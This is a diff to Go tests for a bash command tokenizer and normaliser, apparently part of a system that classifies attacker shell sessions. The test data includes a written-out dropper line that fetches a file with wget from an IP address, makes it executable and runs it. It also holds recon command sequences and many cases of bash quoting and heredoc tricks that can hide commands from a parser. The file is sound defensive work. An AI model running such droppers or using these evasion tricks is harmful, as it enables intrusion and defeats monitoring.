@@ -10,17 +10,64 @@ import (
 
 func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }
 
-// tokenRe specifies the scanner's tokens: the scanner is a hand-written,
-// resumable form of this expression (a heredoc body is cut out by source
-// lines and tokenising resumes after it), and the fuzz target checks that
-// the two agree on every input.
-var tokenRe = regexp.MustCompile(`\d*<<<|\d*<<-?|\d*(?:>>?|<)&(?:\d+|-)?|&>>?|\d*>\||\d*<>|\d+>>?|\d+<|\n|\|\||&&|>>|[;|&<>()]|"[^"]*"|'[^']*'|[^\s;|&<>()]+`)
+// tokenRe specifies the scanner's tokens, as source spans: the scanner is
+// a hand-written, resumable form of this expression (a heredoc body is cut
+// out by source lines and tokenising resumes after it), and the fuzz target
+// checks that the two agree on every input the expression can describe
+// (tokenSpecCovers). Between the bytes of an operator, and anywhere between
+// tokens, a line continuation (backslash-newline) may appear; matches that
+// are only continuations or a comment are not tokens (specTokens drops
+// them). A word is a run of escapes, quoted strings and other bytes; a quote
+// that never closes is an ordinary byte. `((` is an arithmetic opener only
+// when bash's lookahead finds its `))`, which no expression can check, so
+// the spec reads `((` as two tokens and scanAll splits the scanner's.
+var tokenRe = func() *regexp.Regexp {
+	const c = `(?:\\\n)*` // continuations
+	op := func(parts ...string) string { return strings.Join(parts, c) }
+	d, d1 := `(?:\d`+c+`)*`, `(?:\d`+c+`)+` // \d* and \d+, continuations allowed
+	return regexp.MustCompile(strings.Join([]string{
+		`(?:\\\n)+`, // continuations between tokens
+		`#[^\n]*`,   // a comment, only ever matched at a token start
+		d + op(`<`, `<`, `<`), d + op(`<`, `<`, `-`), d + op(`<`, `<`),
+		d + `(?:` + op(`>`, `>`, `&`) + `|` + op(`>`, `&`) + `|` + op(`<`, `&`) + `)(?:(?:` + c + `\d)+|` + c + `-)?`,
+		op(`&`, `>`, `>`), op(`&`, `>`),
+		d + op(`>`, `\|`), d + op(`<`, `>`), d1 + op(`>`, `>`), d1 + `>`, d1 + `<`,
+		`\n`, op(`\|`, `\|`), op(`&`, `&`), op(`>`, `>`), `[;|&<>()]`,
+		`(?:\\[\s\S]|'[^']*'|"(?:[^"\\]|\\[\s\S])*"|\$'(?:[^'\\]|\\[\s\S])*'|\$"(?:[^"\\]|\\[\s\S])*"|[^ \t\n;|&<>()])+`,
+	}, "|"))
+}()
 
+// tokenSpecCovers reports whether tokenRe can describe s: it has no
+// backtick, no ${...} and no $(...) that a double quote could hold, the
+// constructs the scanner reads whole by nesting.
+func tokenSpecCovers(s string) bool {
+	return !strings.ContainsAny(s, "`") && !strings.Contains(s, "${") && !(strings.Contains(s, "$(") && strings.Contains(s, `"`))
+}
+
+func specTokens(s string) []string {
+	var out []string
+	for _, m := range tokenRe.FindAllString(s, -1) {
+		if m[0] == '#' || strings.Trim(m, "\\\n") == "" && strings.HasPrefix(m, "\\\n") {
+			continue
+		}
+		out = append(out, m)
+	}
+	return out
+}
+
+// scanAll returns the scanner's tokens as source spans, with an arithmetic
+// (( split in two as the spec reads it.
 func scanAll(s string) []string {
 	var out []string
 	sc := scanner{s: s}
 	for sc.next(); sc.ok(); sc.next() {
-		out = append(out, sc.tok)
+		span := s[sc.start:sc.end]
+		if sc.tok == "((" {
+			i := strings.IndexByte(span[1:], '(') + 1
+			out = append(out, span[:i], span[i:])
+			continue
+		}
+		out = append(out, span)
 	}
 	return out
 }
@@ -28,9 +75,15 @@ func scanAll(s string) []string {
 func TestScannerMatchesTokenRe(t *testing.T) {
 	for _, s := range []string{
 		"", " ", "a", `2>&1 &>>x >>& 3>> 1<&- <&3 >&`, "echo \"a b\" 'c;d' \"open", "x'y 'z", "a\vb\tc\fd\re\nf",
-		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "0</dev/null 2<>f <> >| 2>| >>| >|| 3<", "\xff\x00\"\xfe\"", `$(a) $((1+2)) "a\"b"`,
+		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "0</dev/null 2<>f <> >| 2>| >>| >|| 3<", "\xff\x00\"\xfe\"", `$(a) $((1+2))`, `"a\"b"`,
+		"#!/bin/sh\nid # c 'x\n#", "a#b ;#c\n(#d", "echo \"\\\"\" ; cd /tmp", `a\;b \<<x \ y \`, "a \\\n#x\nb\\\nc",
+		">\\\n> 2\\\n>f <\\\n<E &\\\n& |\\\n| 1\\\n2<&\\\n-", "x'a\nb'y \"a\\\nb\" $'a\\'b' $\"a\\\"b\" $'open", "'open \"open $\"open",
+		"\\", "a\\", "\\\n", "echo a\x1fb\x1ec",
 	} {
-		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
+		if !tokenSpecCovers(s) {
+			t.Fatalf("%q is outside the spec", s)
+		}
+		if got, want := scanAll(s), specTokens(s); !reflect.DeepEqual(got, want) {
 			t.Errorf("scan(%q)\n got %q\nwant %q", s, got, want)
 		}
 	}
@@ -72,8 +125,10 @@ func TestEncodingRoundTripsQuotedTokens(t *testing.T) {
 	if n := CommandCount(got); n != 3 {
 		t.Fatalf("CommandCount = %d, want 3 (quoted separators are not commands)", n)
 	}
-	if strings.ContainsAny(EncodeLine("a\x1fb\x1ec"), "\x1e") || len(Split(EncodeLine("a\x1fb\x1ec"))[0]) != 3 {
-		t.Fatal("separator bytes from attacker input must be stripped")
+	// Separator bytes are ordinary word bytes to bash: they are encoded, not
+	// read as blanks (they used to split `a\x1fb` into two words).
+	if got := Split(EncodeLine("a\x1fb\x1ec")); !reflect.DeepEqual(got, [][]string{{"a<us>b<rs>c"}}) {
+		t.Fatalf("separator bytes from attacker input: %q", got)
 	}
 }
 
@@ -139,7 +194,7 @@ func FuzzNormalizeCommand(f *testing.F) {
 		f.Add(s)
 	}
 	f.Fuzz(func(t *testing.T, s string) {
-		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
+		if got, want := scanAll(s), specTokens(s); tokenSpecCovers(s) && !reflect.DeepEqual(got, want) {
 			t.Fatalf("scanner disagrees with tokenRe on %q:\n got %q\nwant %q", s, got, want)
 		}
 		line := EncodeLine(s)
@@ -503,7 +558,7 @@ func TestHeredocQuotedDelimiters(t *testing.T) {
 	for _, tc := range []struct{ in, want string }{
 		{"cat <<EOF\n  EOF\nid\nEOF\nwhoami", "whoami"},
 		{"cat <<-EOF\n\t\tEOF\nwhoami", "whoami"},
-		{"cat <<EOF\nEOF\r\nwhoami", "whoami"},
+		{"cat <<EOF\r\nEOF\r\nwhoami", "whoami"}, // an all-CRLF event
 	} {
 		got := NormalizeCommand(tc.in)
 		if CommandCount([][]string{got}) != 2 || got[len(got)-1] != tc.want {
@@ -674,7 +729,8 @@ func TestQuotedTextNormalisation(t *testing.T) {
 		{`echo "k=deadbeefdeadbeef00 x"`, `echo "k=<hex> x"`},
 		{`echo "port 8080 mode 777"`, `echo "port 8080 mode 777"`}, // short numbers stay
 		{"echo \"a\nb\"", `echo "a<nl>b"`},
-		{"echo \"a\r\nb\"", `echo "a<cr><nl>b"`},
+		{"echo \"a\rb\nc\"", `echo "a<cr>b<nl>c"`},
+		{"echo \"a\r\nb\"\nid", `echo "a<cr><nl>b" ; id`}, // not all CRLF: the \r is kept
 		{`echo "a\nb"`, `echo "a\nb"`},
 		{`echo "root\n123456789"`, `echo "root\n<n>"`},
 	} {
@@ -756,5 +812,178 @@ func TestHeredocBodyBoundCountsEncoding(t *testing.T) {
 		if tok := got[2]; len(tok) > bound || !strings.HasSuffix(tok, litNL+litMore) {
 			t.Errorf("%s: body token %d bytes, bound %d, cut marked %v", name, len(tok), bound, strings.HasSuffix(tok, litNL+litMore))
 		}
+	}
+}
+
+// Words, comments and escapes follow bash (final audit I1). Each row is the
+// auditor's, checked in bash 5.2 with echo stubs for the programs: the
+// programs bash runs, in order, must be exactly the segments' programs, so
+// nothing bash runs is hidden and nothing it does not run is invented.
+func TestBashWordSyntax(t *testing.T) {
+	for _, tc := range []struct {
+		in    string
+		progs []string
+	}{
+		// \< is a literal <, so <EOF is a file redirection, not a heredoc:
+		// bash runs line 2 and tries a command named EOF.
+		{"echo A \\<<EOF\npython3 x\nEOF\nperl y", []string{"echo", "python3", "EOF", "perl"}},
+		// A comment hides neither a heredoc nor a quote from the next line.
+		{"echo A # <<EOF\npython3 x\nperl y", []string{"echo", "python3", "perl"}},
+		{"echo A # 'x\npython3 y", []string{"echo", "python3"}},
+		{"#!/bin/sh\nP1 a", []string{"P1"}},
+		{"echo a;#b\nP1", []string{"echo", "P1"}},
+		{"echo a#b c", []string{"echo"}}, // # inside a word is a byte
+		// An escaped quote does not end a double-quoted string.
+		{`echo "\"" ; cd /tmp ; echo "\""`, []string{"echo", "cd", "echo"}},
+		{`echo "\"; python3 x"`, []string{"echo"}},
+		{`echo a\;python3 x`, []string{"echo"}},
+		// A backslash-newline is removed wherever it is, even mid-word.
+		{"echo A \\\npython3 y", []string{"echo"}},
+		{"P\\\n1 x", []string{"P1"}},
+		{"echo a \\\n#x\nP1", []string{"echo", "P1"}},
+		{"echo a # b \\\nP1 c", []string{"echo", "P1"}}, // not inside a comment
+		// A quote may start mid-word and span lines.
+		{"echo x'\npython3 y\n'", []string{"echo"}},
+		// Backticks read to the next unescaped backtick, quotes included.
+		{"echo `echo '` ; P1 x ; echo `'`", []string{"echo", "P1", "echo"}},
+		{"echo `echo \\` ; P1` ; P2", []string{"echo", "P2"}},
+		// A command substitution inside double quotes is read whole, so its
+		// quotes do not end the string.
+		{"echo \"$(echo ')\"')\"\nP1 z\necho \"'\"", []string{"echo", "P1", "echo"}},
+		{"echo \"$(case a in a) echo \"hi\";; esac)\" ; P1", []string{"echo", "P1"}},
+		{"echo \"$(cat <<E\n)\nE\n)\" ; P1", []string{"echo", "P1"}},
+		{"echo \"$(echo # )\n)\"\nP1", []string{"echo", "P1"}},
+		// ${...} is one word, quotes and operators included; a bare { does
+		// not nest.
+		{"echo ${x:-a;P1} ; P2", []string{"echo", "P2"}},
+		{"echo ${x:-'}'} ; P1", []string{"echo", "P1"}},
+		{"echo ${x:-{} ; P1 }", []string{"echo", "P1"}},
+		// Continuations inside operators: >\<nl>> is >>, <\<nl><EOF a heredoc.
+		{"cat <\\\n<EOF\nP1\nEOF\nP2", []string{"cat", "P2"}},
+		{"echo b >\\\n> f; P1", []string{"echo", "P1"}},
+		// (( ... ) is two subshells.
+		{"((P1 x); P2)", []string{"P1", "P2"}},
+	} {
+		got := programs(tc.in)
+		if !reflect.DeepEqual(got, tc.progs) {
+			t.Errorf("programs(%q) = %q, want %q (tokens %q)", tc.in, got, tc.progs, NormalizeCommand(tc.in))
+		}
+	}
+	d := func(s string) bool { return Distinctive([][]string{NormalizeCommand(s)}) }
+	const dropper = "cd /tmp ; wget 1.2.3.4/x ; chmod +x x ; ./x ; rm x"
+	if !d(dropper) || !d(`echo "\"" ; `+dropper+` ; echo "\""`) {
+		t.Error("a dropper between escaped quotes lost its Distinctive")
+	}
+	for _, s := range []string{
+		"#!/bin/sh\nid; w; uptime; whoami; uname -a",
+		"id; w; uptime; whoami\n# just a note",
+		`id; w; uptime; whoami; echo "\"; python3 x"`,
+		`id; w; uptime; whoami; echo a\;python3 x`,
+		"id; w; uptime; whoami\necho A \\\npython3 y",
+		"id; w; uptime; whoami; echo x'\npython3 y\n'",
+		"id; w; uptime; whoami; echo ${x:-a;python3}",
+		"\\id; \\w; 'uptime'; \"who\"ami; u\\\nname -a",
+	} {
+		if d(s) {
+			t.Errorf("recon-only %q is Distinctive (programs %q)", s, programs(s))
+		}
+	}
+	// Collision: bash prints different strings, so the encodings differ.
+	if EncodeLine(`echo "\"   x   y"`) == EncodeLine(`echo "\" x y"`) {
+		t.Error("spacing inside an escaped-quote string collided")
+	}
+	// A continuation outside quotes is gone from the token; inside quotes it
+	// is kept (the encoding stays as specific as the source).
+	if got := norm("ec\\\nho a\\\nb 'c\\\nd'"); got != "echo ab 'c\\<nl>d'" {
+		t.Errorf("continuations: %q", got)
+	}
+}
+
+// A heredoc delimiter holding a substitution is read literally, to its
+// closing ), `, } or )), as bash 5.2 does: `<<$(x)` ended the word at its
+// paren, so no line ever matched and the rest was hidden (final audit M1).
+func TestHeredocDelimiterSubstitutions(t *testing.T) {
+	for _, tc := range []struct{ word, term string }{
+		{`$(x)`, `$(x)`},
+		{`$(echo "a b")`, `$(echo "a b")`},
+		{`$((1+2))`, `$((1+2))`},
+		{"`x`", "`x`"},
+		{"`echo \"a\"`", "`echo \"a\"`"},
+		{`${x}y`, `${x}y`},
+		{`${x:-"a"}`, `${x:-"a"}`},
+		{`E${x}OF`, `E${x}OF`},
+		{`"$(x)"`, `$(x)`},
+	} {
+		in := "cat <<" + tc.word + "\nhello\n" + tc.term + "\npython3 z"
+		if got := programs(in); !reflect.DeepEqual(got, []string{"cat", "python3"}) {
+			t.Errorf("<<%s ending on %q: programs %q (%q)", tc.word, tc.term, got, norm(in))
+		}
+	}
+	// An unclosed substitution is a syntax error, not a heredoc.
+	if got := programs("cat <<$(x\nid"); len(got) != 2 || got[1] != "id" {
+		t.Errorf("unclosed $( delimiter: %q", got)
+	}
+}
+
+// $'...' delimiters decode as bash 5.2 does (final audit M2): \c? is DEL,
+// \c\\ spans both backslashes, \c@ is a NUL that ends the string, \u and
+// \U use bash's UTF-8 (surrogates and values above U+10FFFF encoded, none
+// above 0x7fffffff), and a \c at the end is kept literally. The terminator
+// lines are the bytes bash printed through od.
+func TestAnsiDelimiterEscapes(t *testing.T) {
+	for _, tc := range []struct{ word, term string }{
+		{`$'\c?'`, "\x7f"},
+		{`$'E\cA\c['`, "E\x01\x1b"},
+		{`$'\ca\cz\c\Q'`, "\x01\x1a\x1cQ"},
+		{`$'\c\\\\'`, "\x1c\\"},
+		{`$'\c\'x'`, "\x1c'x"},
+		{`$'a\c@b'`, "a"},
+		{`$'a\c'`, `a\c`},
+		{`$'\U00110000'`, "\xf4\x90\x80\x80"},
+		{`$'\U7fffffff'`, "\xfd\xbf\xbf\xbf\xbf\xbf"},
+		{`$'\U04000000'`, "\xfc\x84\x80\x80\x80\x80"},
+		{`$'\U00200000'`, "\xf8\x88\x80\x80\x80"},
+		{`$'a\U80000000b'`, "ab"},
+		{`$'a\ud800b'`, "a\xed\xa0\x80b"},
+		{`$'\U0001F600'`, "\U0001F600"},
+		{`$'a\u0000b'`, "a"},
+		{`$'\777\xFFF'`, "\xff\xffF"},
+		{`$'\u\x'`, `\u\x`},
+	} {
+		in := "cat <<" + tc.word + " >/dev/null\nx\n" + tc.term + "\npython3 z"
+		if got := programs(in); !reflect.DeepEqual(got, []string{"cat", "python3"}) {
+			t.Errorf("<<%s ending on %q: programs %q", tc.word, tc.term, got)
+		}
+	}
+}
+
+// \r, \f and the separator bytes are ordinary word bytes to bash; only an
+// all-CRLF event has its line endings read as LF (final audit M7).
+func TestControlBytesAreWordBytes(t *testing.T) {
+	for _, pair := range [][2]string{
+		{"wget\rhttp://x/y", "wget http://x/y"},
+		{"echo a\x1fb", "echo a b"},
+		{"echo a\x1eb", "echo a b"},
+		{"echo a\fb", "echo a b"},
+	} {
+		if EncodeLine(pair[0]) == EncodeLine(pair[1]) {
+			t.Errorf("%q collided with %q", pair[0], pair[1])
+		}
+	}
+	// A \r line in an LF event does not end a heredoc (bash keeps reading).
+	for _, s := range []string{
+		"cat <<EOF\nbody\nEOF\r\npython3 x\nid; w; uptime; whoami",
+		"cat <<EOF\r\nbody\nEOF\npython3 x\nid; w; uptime; whoami",
+	} {
+		if got := programs(s); !reflect.DeepEqual(got, []string{"cat"}) {
+			t.Errorf("%q: programs %q, want the rest in the body", s, got)
+		}
+	}
+	// An all-CRLF event encodes like its LF form.
+	if a, b := EncodeLine("cat <<EOF\r\nbody\r\nEOF\r\nid\r\n"), EncodeLine("cat <<EOF\nbody\nEOF\nid\n"); a != b {
+		t.Errorf("CRLF %q != LF %q", a, b)
+	}
+	if EncodeLine("id\r") != EncodeLine("id") {
+		t.Error("a CR-terminated single line differs from its LF form")
 	}
 }
